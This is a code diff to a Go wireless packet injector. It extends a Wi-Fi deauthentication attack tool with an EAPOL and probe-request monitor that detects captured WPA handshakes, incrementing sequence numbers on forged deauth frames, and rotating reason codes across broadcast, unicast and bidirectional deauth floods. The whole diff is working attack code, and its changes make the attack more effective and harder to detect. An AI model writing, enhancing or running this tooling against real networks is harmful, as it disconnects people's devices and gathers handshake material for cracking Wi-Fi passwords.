@@ -16,8 +16,10 @@ import (
 
 // Injector handles active packet injection.
 type Injector struct {
-	Handle *pcap.Handle
-	mu     sync.Mutex
+	Handle    *pcap.Handle
+	Interface string
+	mu        sync.Mutex
+	seq       uint16
 }
 
 // NewInjector creates a new Injector.
@@ -28,7 +30,62 @@ func NewInjector(iface string) (*Injector, error) {
 	if err != nil {
 		return nil, err
 	}
-	return &Injector{Handle: handle}, nil
+	return &Injector{Handle: handle, Interface: iface}, nil
+}
+
+// StartMonitor starts a background packet listener to detect effectiveness events.
+// It sends events ("handshake", "probe") to the provided channel.
+func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events chan<- string) {
+	// Re-open handle for listening if needed or assume handle is bidirectional (pcap.OpenLive is).
+	// We set a BPF filter to only get relevant frames.
+	// Filter: (EAPOL) OR (Probe Request from Target)
+	// EAPOL: ether proto 0x888e
+	// ProbeReq: type mgt subtype probe-req and wlan.sa == targetMAC
+
+	filter := fmt.Sprintf("(ether proto 0x888e) or (type mgt subtype probe-req and wlan addr2 %s)", targetMAC)
+
+	if err := i.Handle.SetBPFFilter(filter); err != nil {
+		log.Printf("Monitor: Failed to set BPF filter: %v", err)
+		return
+	}
+
+	source := gopacket.NewPacketSource(i.Handle, i.Handle.LinkType())
+	packets := source.Packets()
+
+	log.Printf("Monitor: Started listening for events on %s (Filter: %s)", targetMAC, filter)
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case packet, ok := <-packets:
+			if !ok {
+				return
+			}
+
+			// Check packet type
+			// basic check if it's EAPOL
+			if layer := packet.Layer(layers.LayerTypeEAPOL); layer != nil {
+				select {
+				case events <- "handshake":
+				default:
+				}
+				log.Printf("Monitor: Detected HANDSHAKE for %s", targetMAC)
+				continue
+			}
+
+			// Check for Probe Request
+			if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
+				dot11, _ := dot11Layer.(*layers.Dot11)
+				if dot11.Type == layers.Dot11TypeMgmtProbeReq {
+					select {
+					case events <- "probe":
+					default:
+					}
+				}
+			}
+		}
+	}
 }
 
 // BroadcastProbe sends a Probe Request to the broadcast address.
@@ -116,8 +173,9 @@ func (i *Injector) SendDeauthPacket(targetMAC, senderMAC net.HardwareAddr, reaso
 		Address1:       targetMAC, // Destination (receiver)
 		Address2:       senderMAC, // Source (sender)
 		Address3:       senderMAC, // BSSID (same as sender for deauth)
-		SequenceNumber: 0,
+		SequenceNumber: i.seq,
 	}
+	i.seq++ // Increment sequence number
 
 	// Deauth management frame with reason code
 	deauth := &layers.Dot11MgmtDeauthentication{
@@ -168,19 +226,31 @@ func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
 		interval = 100 * time.Millisecond
 	}
 
+	ticker := time.NewTicker(interval)
+	defer ticker.Stop()
+
+	fuzzCodes := []uint16{1, 4, 8}
+	fuzzIdx := 0
+
 	for j := 0; j < count; j++ {
+		reason := config.ReasonCode
+		if config.UseReasonFuzzing {
+			reason = fuzzCodes[fuzzIdx]
+			fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
+		}
+
 		switch config.AttackType {
 		case domain.DeauthBroadcast:
 			// Send deauth from AP to broadcast
 			broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
-			if err := i.SendDeauthPacket(broadcast, targetMAC, config.ReasonCode); err != nil {
+			if err := i.SendDeauthPacket(broadcast, targetMAC, reason); err != nil {
 				log.Printf("Failed to send broadcast deauth: %v", err)
 			}
 
 		case domain.DeauthUnicast:
 			// Send deauth from AP to specific client
 			if clientMAC != nil {
-				if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
+				if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
 					log.Printf("Failed to send unicast deauth: %v", err)
 				}
 			}
@@ -189,18 +259,18 @@ func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
 			// Send bidirectional deauth (AP->Client and Client->AP)
 			if clientMAC != nil {
 				// AP -> Client
-				if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
+				if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
 					log.Printf("Failed to send AP->Client deauth: %v", err)
 				}
 				// Client -> AP
-				if err := i.SendDeauthPacket(targetMAC, clientMAC, config.ReasonCode); err != nil {
+				if err := i.SendDeauthPacket(targetMAC, clientMAC, reason); err != nil {
 					log.Printf("Failed to send Client->AP deauth: %v", err)
 				}
 			}
 		}
 
 		if j < count-1 {
-			time.Sleep(interval)
+			<-ticker.C
 		}
 	}
 
@@ -233,14 +303,23 @@ func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.Deau
 	packetsSent := 0
 	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
 
+	fuzzCodes := []uint16{1, 4, 8}
+	fuzzIdx := 0
+
 	for {
 		select {
 		case <-ctx.Done():
 			return nil
 		case <-ticker.C:
+			reason := config.ReasonCode
+			if config.UseReasonFuzzing {
+				reason = fuzzCodes[fuzzIdx]
+				fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
+			}
+
 			switch config.AttackType {
 			case domain.DeauthBroadcast:
-				if err := i.SendDeauthPacket(broadcast, targetMAC, config.ReasonCode); err != nil {
+				if err := i.SendDeauthPacket(broadcast, targetMAC, reason); err != nil {
 					log.Printf("Failed to send broadcast deauth: %v", err)
 				} else {
 					packetsSent++
@@ -248,7 +327,7 @@ func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.Deau
 
 			case domain.DeauthUnicast:
 				if clientMAC != nil {
-					if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
+					if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
 						log.Printf("Failed to send unicast deauth: %v", err)
 					} else {
 						packetsSent++
@@ -258,13 +337,13 @@ func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.Deau
 			case domain.DeauthTargeted:
 				if clientMAC != nil {
 					// AP -> Client
-					if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
+					if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
 						log.Printf("Failed to send AP->Client deauth: %v", err)
 					} else {
 						packetsSent++
 					}
 					// Client -> AP
-					if err := i.SendDeauthPacket(targetMAC, clientMAC, config.ReasonCode); err != nil {
+					if err := i.SendDeauthPacket(targetMAC, clientMAC, reason); err != nil {
 						log.Printf("Failed to send Client->AP deauth: %v", err)
 					} else {
 						packetsSent++
